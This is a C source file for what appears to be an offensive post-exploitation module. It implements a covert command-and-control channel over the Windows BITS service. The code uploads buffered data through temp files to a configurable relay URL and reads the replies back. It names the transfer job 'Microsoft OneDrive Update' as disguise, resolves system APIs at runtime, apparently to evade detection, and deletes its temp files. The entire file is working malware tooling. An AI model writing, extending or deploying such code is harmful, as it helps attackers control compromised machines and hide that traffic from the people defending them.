#define WIN32_LEAN_AND_MEAN
#define COBJMACROS
#include <windows.h>
#include <objbase.h>
#include <bits.h>
#include <stdint.h>

#ifndef BITS_UDC2_RELAY_URL
#define BITS_UDC2_RELAY_URL "http://127.0.0.1:8090"
#endif

#define POLL_MS       500
#define JOB_TIMEOUT   60000
#define RECV_CAP      (4 * 1024 * 1024)

static size_t xappend(char *dst, size_t cap, size_t pos, const char *src) {
    while (src && *src && pos + 1 < cap) dst[pos++] = *src++;
    dst[pos] = 0;
    return pos;
}

static size_t xhex(char *dst, size_t cap, size_t pos, unsigned long v, int digits) {
    for (int i = digits - 1; i >= 0 && pos + 1 < cap; i--) {
        int nib = (int)((v >> (i * 4)) & 0xF);
        dst[pos++] = (char)(nib < 10 ? '0' + nib : 'a' + nib - 10);
    }
    dst[pos] = 0;
    return pos;
}

static HMODULE g_k32;
typedef HRESULT(WINAPI *fn_CoInitializeEx)(LPVOID, DWORD);
typedef void(WINAPI *fn_CoUninitialize)(void);
typedef HRESULT(WINAPI *fn_CoCreateInstance)(const GUID *, LPUNKNOWN, DWORD, const GUID *, LPVOID *);
typedef ULONG(WINAPI *fn_RtlRandomEx)(PULONG);
static fn_CoInitializeEx pCoInitializeEx;
static fn_CoUninitialize pCoUninitialize;
static fn_CoCreateInstance pCoCreateInstance;
static fn_RtlRandomEx pRtlRandomEx;

typedef HANDLE(WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI *fn_CloseHandle)(HANDLE);
typedef BOOL(WINAPI *fn_DeleteFileA)(LPCSTR);
typedef DWORD(WINAPI *fn_GetTempPathA)(DWORD, LPSTR);
typedef DWORD(WINAPI *fn_GetTickCount)(void);
typedef VOID(WINAPI *fn_Sleep)(DWORD);
typedef DWORD(WINAPI *fn_GetFileSize)(HANDLE, LPDWORD);
typedef int(WINAPI *fn_MultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
typedef HANDLE(WINAPI *fn_GetProcessHeap)(void);
typedef LPVOID(WINAPI *fn_HeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef BOOL(WINAPI *fn_HeapFree)(HANDLE, DWORD, LPVOID);
static fn_MultiByteToWideChar pMultiByteToWideChar;
static fn_GetProcessHeap pGetProcessHeap;
static fn_HeapAlloc pHeapAlloc;
static fn_HeapFree pHeapFree;
static fn_CreateFileA pCreateFileA;
static fn_ReadFile pReadFile;
static fn_WriteFile pWriteFile;
static fn_CloseHandle pCloseHandle;
static fn_DeleteFileA pDeleteFileA;
static fn_GetTempPathA pGetTempPathA;
static fn_GetTickCount pGetTickCount;
static fn_Sleep pSleep;
static fn_GetFileSize pGetFileSize;

static const GUID BITS_CLSID_BCM = {0x4991d34b, 0x80a1, 0x4291,
                                    {0x83, 0xb6, 0x33, 0x28, 0x36, 0x6b, 0x90, 0x97}};
static const GUID BITS_IID_IBackgroundCopyManager = {0x5ce34c0d, 0x0dc9, 0x4c1f,
                                                     {0x89, 0x7c, 0xda, 0xa1, 0xb7, 0x8c, 0xee, 0x7c}};

static struct {
    int initialized;
    int com_owned;
    IBackgroundCopyManager *bcm;
    char sid[16];
    DWORD counter;
} g_state;

static int resolve_all(void) {
    g_k32 = LoadLibraryA("kernel32.dll");
    if (!g_k32) return -1;
    pCreateFileA = (fn_CreateFileA)(void *)GetProcAddress(g_k32, "CreateFileA");
    pReadFile = (fn_ReadFile)(void *)GetProcAddress(g_k32, "ReadFile");
    pWriteFile = (fn_WriteFile)(void *)GetProcAddress(g_k32, "WriteFile");
    pCloseHandle = (fn_CloseHandle)(void *)GetProcAddress(g_k32, "CloseHandle");
    pDeleteFileA = (fn_DeleteFileA)(void *)GetProcAddress(g_k32, "DeleteFileA");
    pGetTempPathA = (fn_GetTempPathA)(void *)GetProcAddress(g_k32, "GetTempPathA");
    pGetTickCount = (fn_GetTickCount)(void *)GetProcAddress(g_k32, "GetTickCount");
    pSleep = (fn_Sleep)(void *)GetProcAddress(g_k32, "Sleep");
    pGetFileSize = (fn_GetFileSize)(void *)GetProcAddress(g_k32, "GetFileSize");
    pMultiByteToWideChar = (fn_MultiByteToWideChar)(void *)GetProcAddress(g_k32, "MultiByteToWideChar");
    pGetProcessHeap = (fn_GetProcessHeap)(void *)GetProcAddress(g_k32, "GetProcessHeap");
    pHeapAlloc = (fn_HeapAlloc)(void *)GetProcAddress(g_k32, "HeapAlloc");
    pHeapFree = (fn_HeapFree)(void *)GetProcAddress(g_k32, "HeapFree");
    if (!pCreateFileA || !pReadFile || !pWriteFile || !pCloseHandle || !pDeleteFileA ||
        !pGetTempPathA || !pGetTickCount || !pSleep || !pGetFileSize ||
        !pMultiByteToWideChar || !pGetProcessHeap || !pHeapAlloc || !pHeapFree)
        return -1;
    HMODULE ole = LoadLibraryA("ole32.dll");
    if (!ole) return -1;
    pCoInitializeEx = (fn_CoInitializeEx)(void *)GetProcAddress(ole, "CoInitializeEx");
    pCoUninitialize = (fn_CoUninitialize)(void *)GetProcAddress(ole, "CoUninitialize");
    pCoCreateInstance = (fn_CoCreateInstance)(void *)GetProcAddress(ole, "CoCreateInstance");
    if (!pCoInitializeEx || !pCoUninitialize || !pCoCreateInstance) return -1;
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (ntdll)
        pRtlRandomEx = (fn_RtlRandomEx)(void *)GetProcAddress(ntdll, "RtlRandomEx");
    return 0;
}

static void make_sid(void) {
    ULONG seed = pGetTickCount() ^ (ULONG)(uintptr_t)&g_state;
    unsigned long a = pRtlRandomEx ? pRtlRandomEx(&seed) : (unsigned long)(seed * 2654435761u);
    unsigned long b = pRtlRandomEx ? pRtlRandomEx(&seed) : (unsigned long)(seed * 40503u);
    size_t pos = 0;
    pos = xhex(g_state.sid, sizeof(g_state.sid), pos, a, 8);
    (void)xhex(g_state.sid, sizeof(g_state.sid), pos, b, 8);
}

static int init_state(void) {
    if (g_state.initialized) return 0;
    if (resolve_all() != 0) return -1;
    HRESULT hr = pCoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    g_state.com_owned = SUCCEEDED(hr);
    hr = pCoCreateInstance(&BITS_CLSID_BCM, NULL, CLSCTX_LOCAL_SERVER,
                           &BITS_IID_IBackgroundCopyManager, (void **)&g_state.bcm);
    if (FAILED(hr)) {
        if (g_state.com_owned) pCoUninitialize();
        g_state.com_owned = 0;
        return -1;
    }
    make_sid();
    g_state.counter = 0;
    g_state.initialized = 1;
    return 0;
}

static int write_temp(const char *prefix, const unsigned char *data, size_t len,
                      char *path_out, size_t path_sz) {
    static char tmp[MAX_PATH];
    DWORD n = pGetTempPathA(sizeof(tmp), tmp);
    if (n == 0 || n >= sizeof(tmp)) return -1;
    size_t pos = 0;
    pos = xappend(path_out, path_sz, pos, tmp);
    pos = xappend(path_out, path_sz, pos, prefix);
    pos = xhex(path_out, path_sz, pos, (unsigned long)pGetTickCount(), 8);
    (void)xappend(path_out, path_sz, pos, ".tmp");
    HANDLE h = pCreateFileA(path_out, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    BOOL ok = TRUE;
    if (len > 0) {
        DWORD wrote = 0;
        ok = pWriteFile(h, data, (DWORD)len, &wrote, NULL) && wrote == (DWORD)len;
    }
    pCloseHandle(h);
    return ok ? 0 : -1;
}

static int read_whole(const char *path, unsigned char **out, size_t *out_len) {
    HANDLE h = pCreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    DWORD size = pGetFileSize(h, NULL);
    if (size == INVALID_FILE_SIZE || size > RECV_CAP) {
        pCloseHandle(h);
        return -1;
    }
    unsigned char *buf = (unsigned char *)pHeapAlloc(pGetProcessHeap(), 0, size ? size : 1);
    if (!buf) {
        pCloseHandle(h);
        return -1;
    }
    DWORD got = 0;
    if (size && !pReadFile(h, buf, size, &got, NULL)) {
        pHeapFree(pGetProcessHeap(), 0, buf);
        pCloseHandle(h);
        return -1;
    }
    pCloseHandle(h);
    *out = buf;
    *out_len = got;
    return 0;
}

static int bits_transfer(IBackgroundCopyManager *bcm, BG_JOB_TYPE type,
                         const char *local_path, const char *reply_path,
                         const char *remote_url, const wchar_t *display_name) {
    static wchar_t wurl[1024], wlocal[MAX_PATH], wreply[MAX_PATH];
    IBackgroundCopyJob *job = NULL;
    GUID jid;
    pMultiByteToWideChar(65001, 0, remote_url, -1, wurl, 1024);
    pMultiByteToWideChar(65001, 0, local_path, -1, wlocal, MAX_PATH);
    pMultiByteToWideChar(65001, 0, reply_path, -1, wreply, MAX_PATH);

    HRESULT hr = IBackgroundCopyManager_CreateJob(bcm, display_name, type, &jid, &job);
    if (FAILED(hr)) return -1;
    hr = IBackgroundCopyJob_AddFile(job, wurl, wlocal);
    if (FAILED(hr)) {
        IBackgroundCopyJob_Cancel(job);
        IBackgroundCopyJob_Release(job);
        return -1;
    }
    if (type == BG_JOB_TYPE_UPLOAD_REPLY) {
        static const GUID IID_JOB2 = {0x54b50739, 0x686f, 0x45eb,
                                      {0x9d, 0xff, 0xd6, 0xa9, 0xa0, 0xfa, 0xa9, 0xaf}};
        IBackgroundCopyJob2 *job2 = NULL;
        hr = IBackgroundCopyJob_QueryInterface(job, &IID_JOB2, (void **)&job2);
        if (FAILED(hr)) {
            IBackgroundCopyJob_Cancel(job);
            IBackgroundCopyJob_Release(job);
            return -1;
        }
        hr = IBackgroundCopyJob2_SetReplyFileName(job2, wreply);
        IBackgroundCopyJob2_Release(job2);
        if (FAILED(hr)) {
            IBackgroundCopyJob_Cancel(job);
            IBackgroundCopyJob_Release(job);
            return -1;
        }
    }
    hr = IBackgroundCopyJob_Resume(job);
    if (FAILED(hr)) {
        IBackgroundCopyJob_Cancel(job);
        IBackgroundCopyJob_Release(job);
        return -1;
    }

    DWORD start = pGetTickCount();
    BG_JOB_STATE st = BG_JOB_STATE_QUEUED;
    int rc = -1;
    for (;;) {
        if (FAILED(IBackgroundCopyJob_GetState(job, &st))) break;
        if (st == BG_JOB_STATE_TRANSFERRED) {
            IBackgroundCopyJob_Complete(job);
            rc = 0;
            break;
        }
        if (st == BG_JOB_STATE_ERROR || st == BG_JOB_STATE_CANCELLED) break;
        if (pGetTickCount() - start > JOB_TIMEOUT) {
            break;
        }
        pSleep(POLL_MS);
    }
    if (rc != 0) IBackgroundCopyJob_Cancel(job);
    IBackgroundCopyJob_Release(job);
    return rc;
}

int udc2Proxy(const char *sendBuf, int sendBufLen, char *recvBuf, int recvBufMaxLen) {
    if (!recvBuf || recvBufMaxLen <= 0) return -1;
    if (init_state() != 0) return -2;
    if (!sendBuf || sendBufLen <= 0) return -1;
    if ((size_t)sendBufLen > 8 * 1024 * 1024) return -3;

    static char up_url[1200], local[MAX_PATH], reply[MAX_PATH];

    if (write_temp("~u2u", (const unsigned char *)sendBuf, (size_t)sendBufLen,
                   local, sizeof(local)) != 0)
        return -4;
    if (write_temp("~u2r", (const unsigned char *)"", 0, reply, sizeof(reply)) != 0) {
        pDeleteFileA(local);
        return -6;
    }
    pDeleteFileA(reply);

    size_t pos = 0;
    pos = xappend(up_url, sizeof(up_url), pos, BITS_UDC2_RELAY_URL);
    pos = xappend(up_url, sizeof(up_url), pos, "/up/");
    pos = xappend(up_url, sizeof(up_url), pos, g_state.sid);
    pos = xappend(up_url, sizeof(up_url), pos, "/");
    pos = xhex(up_url, sizeof(up_url), pos, g_state.counter++, 8);
    (void)xappend(up_url, sizeof(up_url), pos, "");

    int rc = bits_transfer(g_state.bcm, BG_JOB_TYPE_UPLOAD_REPLY, local, reply,
                           up_url, L"Microsoft OneDrive Update");
    pDeleteFileA(local);
    if (rc != 0) {
        pDeleteFileA(reply);
        return -5;
    }

    unsigned char *body = NULL;
    size_t body_len = 0;
    if (read_whole(reply, &body, &body_len) != 0) {
        pDeleteFileA(reply);
        return -8;
    }
    pDeleteFileA(reply);

    size_t n = body_len;
    if (n > (size_t)recvBufMaxLen) n = (size_t)recvBufMaxLen;
    for (size_t i = 0; i < n; i++) recvBuf[i] = (char)body[i];
    pHeapFree(pGetProcessHeap(), 0, body);
    return (int)n;
}

void udc2Close(void) {
    if (g_state.bcm) {
        IBackgroundCopyManager_Release(g_state.bcm);
        g_state.bcm = NULL;
    }
    if (g_state.com_owned) {
        pCoUninitialize();
        g_state.com_owned = 0;
    }
    g_state.initialized = 0;
}

typedef int (*UDC2ProxyCall)(const char *sendBuf, int sendBufLen, char *recvBuf, int recvBufMaxLen);
typedef void (*UDC2ProxyClose)(void);
typedef struct _UDC2_INFO {
    DWORD version;
    UDC2ProxyCall proxyCall;
    UDC2ProxyClose proxyClose;
} UDC2_INFO, *PUDC2_INFO;

void go(char *args, int len) {
    (void)len;
    if (!args) return;
    PUDC2_INFO info = (PUDC2_INFO)args;
    if (init_state() != 0) return;
    info->proxyCall = udc2Proxy;
    info->proxyClose = udc2Close;
}
